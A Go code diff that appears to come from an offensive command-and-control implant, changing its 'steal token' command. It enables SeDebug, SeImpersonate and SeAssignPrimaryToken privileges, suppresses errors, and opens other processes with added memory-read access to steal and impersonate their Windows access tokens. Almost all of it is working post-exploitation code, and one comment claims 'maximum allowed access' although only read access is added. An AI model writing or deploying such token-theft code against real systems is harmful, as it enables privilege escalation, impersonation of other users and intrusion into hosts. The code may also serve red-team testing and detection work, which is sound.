@@ -22,8 +22,10 @@ var (
 )
 
 const (
-	SE_PRIVILEGE_ENABLED = 0x00000002
-	SE_DEBUG_NAME        = "SeDebugPrivilege"
+	SE_PRIVILEGE_ENABLED      = 0x00000002
+	SE_DEBUG_NAME             = "SeDebugPrivilege"
+	SE_IMPERSONATE_NAME       = "SeImpersonatePrivilege"
+	SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
 )
 
 type LUID struct {
@@ -41,7 +43,7 @@ type TOKEN_PRIVILEGES struct {
 	Privileges     [1]LUID_AND_ATTRIBUTES
 }
 
-func enableDebugPrivilege() error {
+func enablePrivilege(privilegeName string) error {
 	var hToken windows.Token
 	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
 	if err != nil {
@@ -50,7 +52,7 @@ func enableDebugPrivilege() error {
 	defer hToken.Close()
 
 	var luid LUID
-	privName, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)
+	privName, _ := windows.UTF16PtrFromString(privilegeName)
 	ret, _, _ := procLookupPrivilegeValue.Call(
 		0,
 		uintptr(unsafe.Pointer(privName)),
@@ -82,6 +84,18 @@ func enableDebugPrivilege() error {
 		return fmt.Errorf("AdjustTokenPrivileges failed")
 	}
 
+	return nil
+}
+
+func enableTokenPrivileges() error {
+	// Enable critical privileges for token manipulation
+	privileges := []string{SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME}
+	for _, priv := range privileges {
+		if err := enablePrivilege(priv); err != nil {
+			// Don't fail if we can't enable all - some might not be available
+			continue
+		}
+	}
 	return nil
 }
 
@@ -139,10 +153,8 @@ func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.A
 func stealToken(pid uint32) (string, error) {
 	var output string
 
-	// Enable SeDebugPrivilege to open tokens from other processes
-	if err := enableDebugPrivilege(); err != nil {
-		output += fmt.Sprintf("Warning: Could not enable SeDebugPrivilege: %v\n", err)
-	}
+	// Enable required privileges for token manipulation
+	enableTokenPrivileges()
 
 	// Get original context before stealing (like Apollo shows "Old Claims")
 	processHandle, err := windows.GetCurrentProcess()
@@ -161,9 +173,9 @@ func stealToken(pid uint32) (string, error) {
 		}
 	}
 
-	// Open target process
+	// Open target process with maximum allowed access (like Apollo)
 	hProcess, err := windows.OpenProcess(
-		windows.PROCESS_QUERY_INFORMATION,
+		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
 		false,
 		pid,
 	)
